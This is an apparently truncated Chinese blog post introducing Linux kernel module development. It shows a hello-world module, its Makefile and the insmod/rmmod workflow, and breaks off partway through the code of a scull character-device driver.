<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="kernel入门编译驱动程序hello.c &#x2F;usr&#x2F;src&#x2F;linux-headers-4.4.0-174&#x2F;  –&gt; 该内核源码目录&#x2F;usr&#x2F;src&#x2F;linux-headers-4.4.0-174-generic&#x2F;    –&gt; 该内核编译好的源码目录  切到&#x2F;usr&#x2F;src&#x2F;linux-headers-4.4.0-174-generic路径 然后make menuconfig，我照着">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel入门">
<meta property="og:url" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/index.html">
<meta property="og:site_name" content="Coldshield&#39;s blog">
<meta property="og:description" content="kernel入门编译驱动程序hello.c &#x2F;usr&#x2F;src&#x2F;linux-headers-4.4.0-174&#x2F;  –&gt; 该内核源码目录&#x2F;usr&#x2F;src&#x2F;linux-headers-4.4.0-174-generic&#x2F;    –&gt; 该内核编译好的源码目录  切到&#x2F;usr&#x2F;src&#x2F;linux-headers-4.4.0-174-generic路径 然后make menuconfig，我照着">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584795814785.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584962662551.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584963141639.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584964191239.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584964631604.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584965699729.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584966164347.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584966068272.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584974897309.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584974842581.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584974968510.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584975417499.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584975853772.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584976661640.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584976821281.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584977702149.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585008529686.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585008988570.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585009204137.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585009743004.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585010675845.png">
<meta property="og:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585011340948.png">
<meta property="article:published_time" content="2020-03-23T10:07:41.000Z">
<meta property="article:modified_time" content="2020-03-24T01:10:05.089Z">
<meta property="article:author" content="Coldshield">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584795814785.png">

<link rel="canonical" href="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>kernel入门 | Coldshield's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Coldshield's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Mostly PWN & RE</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          kernel入门
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-03-23 18:07:41" itemprop="dateCreated datePublished" datetime="2020-03-23T18:07:41+08:00">2020-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-03-24 09:10:05" itemprop="dateModified" datetime="2020-03-24T09:10:05+08:00">2020-03-24</time>
              </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/03/23/kernel%E5%85%A5%E9%97%A8/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/03/23/kernel%E5%85%A5%E9%97%A8/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="kernel入门"><a href="#kernel入门" class="headerlink" title="kernel入门"></a>kernel入门</h1><h2 id="编译驱动程序"><a href="#编译驱动程序" class="headerlink" title="编译驱动程序"></a>编译驱动程序</h2><h3 id="hello-c"><a href="#hello-c" class="headerlink" title="hello.c"></a>hello.c</h3><hr>
<p><code>/usr/src/linux-headers-4.4.0-174/</code>  –&gt; 该内核源码目录<br><code>/usr/src/linux-headers-4.4.0-174-generic/</code>    –&gt; 该内核编译好的源码目录</p>
<hr>
<p>切到<code>/usr/src/linux-headers-4.4.0-174-generic</code>路径</p>
<p>然后<code>make menuconfig</code>，我<a href="https://blog.csdn.net/prophet10086/article/details/78459530" target="_blank" rel="noopener">照着</a>大致修改了一下有些没有开启的东西（乱开一通系列…）</p>
<p>切回我们第一个想编译的程序路径</p>
<p>第一个驱动程序<code>hello.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">"Hello, world\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">"Goodbye, cruel world\n"</span>);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);<span class="comment">//module_exit会将这个函数</span></span><br></pre></td></tr></table></figure>

<p>Makefile</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># To build modules outside of the kernel tree, we run "make"</span></span><br><span class="line"><span class="comment"># in the kernel source tree; the Makefile these then includes this</span></span><br><span class="line"><span class="comment"># Makefile once again.</span></span><br><span class="line"><span class="comment"># This conditional selects whether we are being included from the</span></span><br><span class="line"><span class="comment"># kernel Makefile or not.</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Assume the source tree is where the running kernel was built</span></span><br><span class="line">    <span class="comment"># You should set KERNELDIR in the environment if it's elsewhere</span></span><br><span class="line">    KERNELDIR ?= /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">    <span class="comment"># The current directory is passed to sub-makes as argument</span></span><br><span class="line">    PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">modules_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: modules modules_install clean</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># called from kernel build system: just declare what our modules are</span></span><br><span class="line">    obj-m := hello.o</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p>接着执行<code>make</code></p>
<p>编译好了之后就可以在目录下看到这个文件（kenel object缩写）</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584795814785.png" alt="1584795814785"></p>
<p>使用<code>sudo insmod hello.ko</code>即可加载该驱动程序（模块）    //此时会调用module_init设置的设备初始化函数</p>
<p><code>lsmod |grep hello</code>可以看到驱动被成功加载</p>
<p><code>tail /var/log/syslog</code>可以看到最后一行是程序的init加载就输出的内容</p>
<p><code>rmmod</code>移除模块    //此时会调用module_exit设置的设备退出函数</p>
<p><code>tail /var/log/syslog</code>也可以看到程序fini输出的内容了</p>
<h4 id="IDA界面如下"><a href="#IDA界面如下" class="headerlink" title="IDA界面如下"></a>IDA界面如下</h4><p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584962662551.png" alt="1584962662551"></p>
<p>其中printk似乎会在字符串前面加上一个1，左边就可以看到我们的驱动有init和exit两个函数了</p>
<h2 id="在dev下增加驱动文件"><a href="#在dev下增加驱动文件" class="headerlink" title="在dev下增加驱动文件"></a>在dev下增加驱动文件</h2><p>参考来自：<a href="https://paper.seebug.org/779/#_2" target="_blank" rel="noopener">https://paper.seebug.org/779/#_2</a></p>
<p>这段代码很长，不过我主要只是理解了其中一个概念：<code>struct file_operations scull_fops</code>是啥</p>
<p>当然我当时编译的时候报错了，下面这段代码要加上一个<a href="https://blog.csdn.net/zbqwxy/article/details/8697896" target="_blank" rel="noopener">这个</a>，还有把<code>raw_copy_...</code>函数前面的<code>raw_</code>去掉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;   /* printk() */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;     /* kmalloc() */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;       /* everything... */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/errno.h&gt;    /* error codes */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;    /* size_t */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fcntl.h&gt;    /* O_ACCMODE */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;    /* copy_*_user */</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Hcamael"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> scull_major =   <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> scull_minor =   <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> scull_nr_devs = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> scull_quantum = <span class="number">4000</span>;</span><br><span class="line"><span class="keyword">int</span> scull_qset = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scull_qset</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> **data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_qset</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scull_dev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_qset</span> *<span class="title">data</span>;</span>  <span class="comment">/* Pointer to first quantum set. */</span></span><br><span class="line">    <span class="keyword">int</span> quantum;              <span class="comment">/* The current quantum size. */</span></span><br><span class="line">    <span class="keyword">int</span> qset;                 <span class="comment">/* The current array size. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span>;       <span class="comment">/* Amount of data stored here. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> access_key;  <span class="comment">/* Used by sculluid and scullpriv. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span>       <span class="comment">/* Mutual exclusion semaphore. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span>     <span class="comment">/* Char device structure. */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scull_dev</span> *<span class="title">scull_devices</span>;</span>    <span class="comment">/* allocated in scull_init_module */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Follow the list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct scull_qset *<span class="title">scull_follow</span><span class="params">(struct scull_dev *dev, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_qset</span> *<span class="title">qs</span> = <span class="title">dev</span>-&gt;<span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Allocate the first qset explicitly if need be. */</span></span><br><span class="line">    <span class="keyword">if</span> (! qs) &#123;</span><br><span class="line">        qs = dev-&gt;data = kmalloc(<span class="keyword">sizeof</span>(struct scull_qset), GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (qs == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct scull_qset));</span><br><span class="line">    &#125;</span><br><span 